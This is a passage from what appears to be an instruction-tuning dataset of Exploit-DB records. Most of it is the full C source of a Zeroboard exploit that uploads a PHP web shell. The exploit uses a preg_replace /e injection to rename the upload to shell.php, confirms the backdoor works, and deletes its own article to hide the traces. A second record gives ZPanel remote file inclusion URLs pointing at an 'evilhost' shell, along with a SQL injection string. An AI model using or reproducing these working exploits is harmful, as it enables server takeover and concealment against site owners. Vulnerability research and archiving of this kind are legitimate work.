*zb_tid;\nunsigned short zb_port;\n\nint sockfd = -1;\nint reconn=0;\nchar ReadBuf[READSIZE];\nchar WriteBuf[BUFSIZE];\nchar TempBuf[BUFSIZ];\nchar no[16];\n\n\nint main(int argc, char *argv[]){\n\nif(argc < 2) Usage(argv[0]);\n\nif(argc > 2) zb_port = atoi(argv[2]);\nelse zb_port = 80;\n\n// http://host/bbs/zboard.php?id=test\n\nParseZbHost(argv[1]);\n\nConnectZboard(zb_host, zb_port);\n\nWriteZboard();\n\nExploitZboard();\n\nConfirmPHPScript();\n\nDeleteArticle();\n}\n\nvoid ParseZbHost(char *zbhost)\n{\nchar *psbuf;\nchar *sptr=NULL;\nchar *eptr=NULL;\n\npsbuf = malloc(strlen(zbhost)+1);\n\nstrcpy(psbuf, zbhost);\n\nif((sptr = strstr(psbuf,\"http://\")) == NULL) OutputErr(\"http://host need\\n\", 0);\n\nzb_host = sptr+7;\n\nsptr = strchr(zb_host, '/');\nsptr[0] = '\\0';\nsptr++;\n\nif((eptr = strstr(sptr, \"zboard.php?id=\")) == NULL) OutputErr(\"\\\"zboard.php?id=\\\"\nneed\\n\", 0);\n\nzb_tid = eptr+14;\n\neptr--;\neptr[0] = '\\0';\n\nzb_dir = sptr;\n\nfprintf(stdout, \" - Target : http://%s/%s/zboard.php?id=%s\\n\", zb_host, zb_dir,\nzb_tid);\nfflush(stdout);\n}\n\n\nvoid ConnectZboard(char *server, unsigned short port)\n{\n\nstruct sockaddr_in serv;\nstruct hostent *hostname;\n\nif(!(hostname = gethostbyname(server))) OutputErr(server, 1);\nif((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) OutputErr(\"socket\", 1);\n\nmemset(&serv, 0, sizeof(serv));\nserv.sin_family = AF_INET;\nserv.sin_port = htons(port);\nserv.sin_addr.s_addr = *((unsigned long *)hostname->h_addr_list[0]);\n// serv.sin_addr = *((struct in_addr *)hostname->h_addr_list[0]);\n\nif(connect(sockfd, (struct sockaddr *)&serv, sizeof(struct sockaddr)) < 0)\nOutputErr(\"connect\", 1);\n\nif(!reconn) fprintf(stdout,\"\\n [+] %s connecting ok!\\n\", server);\nelse if(reconn == 1) fprintf(stdout, \" [+] %s reconnecting ok!\\n\", server);\nfflush(stdout);\n\nreconn = 0;\n}\n\nvoid WriteZboard(void)\n{\nfd_set fds;\nstruct timeval tv;\nint err = -1;\nint i = 0;\nint cnt=0;\nchar *tmp_ptr, *ptr;\nchar form_data[BUFSIZE];\n\nmemset(form_data, 0, sizeof(form_data));\nsprintf(form_data,\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"page\\\"\\r\\n\"\n\"\\r\\n\"\n\"1\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"id\\\"\\r\\n\"\n\"\\r\\n\"\n\"%s\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"no\\\"\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"select_arrange\\\"\\r\\n\"\n\"\\r\\n\"\n\"headnum\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"desc\\\"\\r\\n\"\n\"\\r\\n\"\n\"asc\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"page_num\\\"\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"keyword\\\"\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"category\\\"\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"sn\\\"\\r\\n\"\n\"\\r\\n\"\n\"off\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"ss\\\"\\r\\n\"\n\"\\r\\n\"\n\"on\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"sc\\\"\\r\\n\"\n\"\\r\\n\"\n\"on\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"mode\\\"\\r\\n\"\n\"\\r\\n\"\n\"write\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"password\\\"\\r\\n\"\n\"\\r\\n\"\n\"1212\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\"\n\"\\r\\n\"\n\"zero\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"email\\\"\\r\\n\"\n\"\\r\\n\"\n\"zero@nzeo.com\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"homepage\\\"\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"subject\\\"\\r\\n\"\n\"\\r\\n\"\n\"zero@nzeo.com hi~!\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"memo\\\"\\r\\n\"\n\"\\r\\n\"\n\"`mv data/%s/d214924151d9e1ffac5bb2258561031e\ndata/%s/shell.php`;# 70ab423bfaea846c9db0b96126254103\\r\\n\"\n//\"-----------------------------8ac34985126d8\\r\\n\"\n//\"Content-Disposition: form-data; name=\\\"sitelink1\\\"\\r\\n\"\n//\"\\r\\n\"\n//\"\\r\\n\"\n//\"-----------------------------8ac34985126d8\\r\\n\"\n//\"Content-Disposition: form-data; name=\\\"sitelink2\\\"\\r\\n\"\n//\"\\r\\n\"\n//\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"file1\\\";\nfilename=\\\"d214924151d9e1ffac5bb2258561031e\\\"\\r\\n\"\n\"Content-Type: text/plain\\r\\n\"\n\"\\r\\n\"\n\"<?\nif(count($_GET)) extract($_GET);\nif(count($_POST)) extract($_POST);\nif(count($_SERVER)) extract($_SERVER);\necho \\\"<form action=$PHP_SELF method=post>\ncommand : <input type=text name=cmd>\n<input type=submit></form><hr>\\\";\nif($cmd){\n$cmd = str_replace(\\\"\\\\\\\\\\\", \\\"\\\", $cmd);\necho \\\"<pre>\\\"; system($cmd); echo \\\"</pre>\\\";\n}\n?>\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"file2\\\"; filename=\\\"\\\"\\r\\n\"\n\"Content-Type: application/octet-stream\\r\\n\"\n\"\\r\\n\"\n\"\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"x\\\"\\r\\n\"\n\"\\r\\n\"\n\"36\\r\\n\"\n\"-----------------------------8ac34985126d8\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"y\\\"\\r\\n\"\n\"\\r\\n\"\n\"11\\r\\n\"\n\"-----------------------------8ac34985126d8--\\r\\n\"\n, zb_tid, zb_tid, zb_tid);\n\n\n\nmemset(WriteBuf, 0, sizeof(WriteBuf));\n\nsprintf(WriteBuf,\n\"POST /%s/write_ok.php HTTP/1.1\\r\\n\"\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\n\"Referer: http://%s/%s/write.php?id=%s&page=1&sn1=&divpage=1&\nsn=off&ss=on&sc=on&select_arrange=headnum&desc=asc&no=&\nmode=write&sn1=&divpage=1\\r\\n\"\n\"Content-Type: multipart/form-data; boundary=---------------------------8ac34985126d8\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\n\"Host: %s\\r\\n\"\n\"Content-Length: %d\\r\\n\"\n\"Connection: Keep-Alive\\r\\n\"\n\"Cache-Control: no-cache\\r\\n\"\n\"\\r\\n\"\"%s\", zb_dir, zb_host, zb_dir, zb_tid, zb_host, strlen(form_data), form_data);\n\nfprintf(stdout, \" [+] Zeroboard writing \");\nfflush(stdout);\n\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\n\ntv.tv_sec = 60;\ntv.tv_usec = 0;\n\nFD_ZERO(&fds);\n\nfor(;;){\n\nmemset(ReadBuf, 0, sizeof(ReadBuf));\n\nif(i!=0xb33f) StatusProcess();\n\nFD_SET(sockfd, &fds);\n\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\nif(FD_ISSET(sockfd, &fds)){\n\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\n\n\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\nif(strstr(ReadBuf+17, \"Connection: close\\r\\n\")) reconn = 1;\n\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) {\nerr++;\n}\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\nOutputErr(\" failed!(page not found)\\n\", 0);\n}\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\nOutputErr(\" failed!(Bad Request)\\n\", 0);\n}\nelse {\nOutputErr(ReadBuf, 0);\n}\n\n}\n\nif(err == 0){\n\nif(strstr(ReadBuf,\"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=zboard.php?id=\"))\n{\nfprintf(stdout, \" ok!\\n\");\nfflush(stdout);\n\nfprintf(stdout,\" [+] Confirmming your article\");\nfflush(stdout);\n\nif(tmp_ptr = strstr(ReadBuf+18, \"url=\")) {\n\nptr = tmp_ptr+4;\nif(ptr != NULL){\nif(tmp_ptr = strchr(ptr,'\"')) tmp_ptr[0] = '\\0';\n}\n}\nif(ptr = strstr(ReadBuf,\"=&no=\")){\nptr += 5;\nmemset(no, 0, sizeof(no));\nfor(i=0; i<16; i++){\nif(ptr[i] == '&') break;\nno[i] = ptr[i];\n}\n}\nif(strlen(no) > 0){\nfprintf(stdout,\" - found!\\n\");\nfflush(stdout);\nreturn;\n}\nelse {\nOutputErr(\" - failed!(not writed!?!)\\n\", 0);\n}\n}\nelse {\nif(strstr(ReadBuf,\"Total Excuted Time :\") && strstr(ReadBuf,\"\\x30\\x0d\\x0a\\x0d\\x0a\")) break;\n}\n}\nelse {\nOutputErr(\"err number error\\n\", 0);\n}\n}\n}\n\nfprintf(stderr, \" error!\\n\");\n\n}\n\nvoid ExploitZboard(void)\n{\nfd_set fds;\nstruct timeval tv;\nint err = -1;\n\nif(reconn == 1) ConnectZboard(zb_host, zb_port);\n\nmemset(WriteBuf, 0, sizeof(WriteBuf));\n\nsprintf(WriteBuf,\n\"GET /%s/view.php?id=%s&page=1&sn1=&divpage=1&sn=off&ss=off&\nsc=on&keyword=70ab423bfaea846c9db0b96126254103/e\"\n, zb_dir, zb_tid);\n\nmemcpy(WriteBuf+strlen(WriteBuf), \"\\x25\\x30\\x30\", 3);\n\nsprintf(WriteBuf+strlen(WriteBuf),\n\"&select_arrange=headnum&desc=asc&no=%s HTTP/1.1\\r\\n\"\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,\napplication/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\n\"Referer: http://%s/%s/zboard.php\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\n\"Host: %s\\r\\n\"\n\"Connection: Keep-Alive\\r\\n\"\n\"\\r\\n\", no, zb_host, zb_dir, zb_host);\n\nfprintf(stdout, \" [+] Exploiting zeroboard start \");\nfflush(stdout);\n\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\n\ntv.tv_sec = 60;\ntv.tv_usec = 0;\n\nFD_ZERO(&fds);\n\nfor(;;){\n\nStatusProcess();\n\nmemset(ReadBuf, 0, sizeof(ReadBuf));\n\nFD_SET(sockfd, &fds);\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\nif(FD_ISSET(sockfd, &fds)){\n\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\n\n\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\n\nif(strstr(ReadBuf,\"Connection: close\\r\\n\")) reconn = 1;\n\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) {\nerr++;\n}\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\nOutputErr(\" failed!(page not found)\\n\", 0);\n}\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\nOutputErr(\" failed!(Bad Request)\\n\", 0);\n}\nelse {\nOutputErr(ReadBuf, 0);\n}\n\n}\n\nif(err >= 0){\n\nif(strstr(ReadBuf,\"Total Excuted Time :\") && strstr(ReadBuf, \"\\x30\\x0d\\x0a\\x0d\\x0a\")){\nfprintf(stdout,\" Done!\\n\");\nfflush(stdout);\nreturn;\n}\n\n}\n\n}\n}\n\nfprintf(stderr,\" error!\\n\");\n\n}\n\nvoid ConfirmPHPScript(void)\n{\nfd_set fds;\nstruct timeval tv;\n\nif(reconn == 1) ConnectZboard(zb_host, zb_port);\n\nmemset(WriteBuf, 0, sizeof(WriteBuf));\nsprintf(WriteBuf,\n\"GET /%s/data/%s/shell.php HTTP/1.1\\r\\n\"\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\n\"Referer: http://%s/%s/zboard.php\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\n\"Host: %s\\r\\n\"\n\"Connection: Keep-Alive\\r\\n\"\n\"\\r\\n\", zb_dir, zb_tid, zb_host, zb_dir, zb_host);\n\nfprintf(stdout, \" [*] Confirmming your backdoor php script\");\nfflush(stdout);\n\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\n\ntv.tv_sec = 60;\ntv.tv_usec = 0;\n\n\nFD_ZERO(&fds);\n\nfor(;;){\nmemset(ReadBuf, 0, sizeof(ReadBuf));\n\nFD_SET(sockfd, &fds);\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\nif(FD_ISSET(sockfd, &fds)){\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\n\n\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\nif(strstr(ReadBuf,\"Connection: close\\r\\n\")) reconn = 1;\n\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) {\nfprintf(stdout,\" - http://%s/%s/data/%s/shell.php is generated!\\n\n[+] Exploiting success!!\\n\", zb_host, zb_dir, zb_tid);\nfflush(stdout);\nreturn;\n}\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\nOutputErr(\" - page not found\\n - 'mv' instruction permission denied.\\n - zeroboard was patched.\\n\"\n\" [-] Exploit failed!\\n\", 0);\n}\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\nOutputErr(\" - Bad Request\\n\"\n\" [-] Exploit failed!\\n\", 0);\n}\nelse {\nOutputErr(ReadBuf, 0);\n}\n}\n\n\n}\n}\n\nfprintf(stderr,\" error!\\n\");\n}\n\n\nvoid DeleteArticle(void)\n{\nfd_set fds;\nstruct timeval tv;\nchar post_data[BUFSIZ];\n\n\nif(reconn == 1) ConnectZboard(zb_host, zb_port);\n\nsprintf(post_data,\n\"page=1&id=%s&no=%s&select_arrange=headnum&desc=asc&page_num=20&keyword=&category=&sn=off&ss=off&sc=on&mode=&c_no=&password=1212&x=20&y=9\\r\\n\", zb_tid, no);\n\nmemset(WriteBuf, 0, sizeof(WriteBuf));\nsprintf(WriteBuf,\n\"POST /%s/delete_ok.php HTTP/1.1\\r\\n\"\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\n\"Referer: http://%s/%s/delete.php?id=%s&page=1&sn1=&divpage=1&sn=off&ss=off&sc=on&select_arrange=headnum&desc=asc&no=%s\\r\\n\"\n\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\n\"Host: %s\\r\\n\"\n\"Content-Length: %d\\r\\n\"\n\"Connection: close\\r\\n\"\n\"Cache-Control: no-cache\\r\\n\"\n\"\\r\\n\"\n\"%s\", zb_dir, zb_host, zb_dir, zb_tid, no, zb_host, strlen(post_data), post_data);\n\n\nfprintf(stdout, \" [*] Remove your article \");\nfflush(stdout);\n\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\n\ntv.tv_sec = 60;\ntv.tv_usec = 0;\n\nFD_ZERO(&fds);\n\nfor(;;){\n\nmemset(ReadBuf, 0, sizeof(ReadBuf));\n\nFD_SET(sockfd, &fds);\n\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\nif(FD_ISSET(sockfd, &fds)){\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\n\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) {\n\nif(strstr(ReadBuf+17, \"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=zboard.php?id=\")) {\nfprintf(stdout, \" - ok! :)\\n\");\nfflush(stdout);\nreturn;\n}\nelse{\nbreak;\n}\n}\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\nOutputErr(\" - failed!(page not found)\\n\", 0);\n}\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\nOutputErr(\" - failed!(Bad Request)\\n\", 0);\n}\nelse {\nfprintf(stderr,\"%s\", ReadBuf);\nexit(1);\n}\n}\n\n}\n}\n\nfprintf(stderr,\" error!\\n\");\n}\n\nvoid StatusProcess(void)\n{\nputchar('.');\nfflush(stdout);\n}\n\n\nvoid OutputErr(char *msg, int type)\n{\nif(!type){\nfprintf(stderr,\"%s\", msg);\nfflush(stderr);\n}\nelse if(type==1){\nif(!strcmp(msg, zb_host)) herror(msg);\nelse perror(msg);\n}\n\nDeleteArticle();\nexit(1);\n}\n\nvoid Usage(char *arg)\n{\nfprintf(stderr,\"[*] Zeroboard preg_replace() vulnerability Remote nobody exploit by n0gada\\n\");\nfprintf(stderr,\"--------------------------------------------------------------------------\\n\");\nfprintf(stderr,\"Usage: %s <SERVER> [PORT - default : 80] \\n\", arg);\nfprintf(stderr,\"--------------------------------------------------------------------------\\n\");\n\nexit(1);\n}\n\n// milw0rm.com [2005-05-31]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 881",
        "output": {
            "ID": "881",
            "File": "exploits/php/webapps/881.txt",
            "Description": "ZPanel 2.5 - SQL Injection",
            "Date Published": "2005-03-15",
            "Author": "Mikhail",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-14",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14803;CVE-2005-0792"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Tested and working /str0ke\n\nIt is possible to include arbitrary file:\nlocal - in version ZPanel <= 2.5 beta 10,\nremote - in ZPanel 2.0.\n\n[exploit for v 2.0]\nhttp://localhost/zpanel/zpanel.php?page=http://evilhost/shell\nwhere http://evilhost/shell.php - evil php code script\n\n[exploit for v 2.5 beta]\nhttp://localhost/zpanel/zpanel.php?page=billinginfo/index.php%00'%20OR%20'1'='1\n\n\n# milw0rm.com [2005-03-15]"
        }
    }
]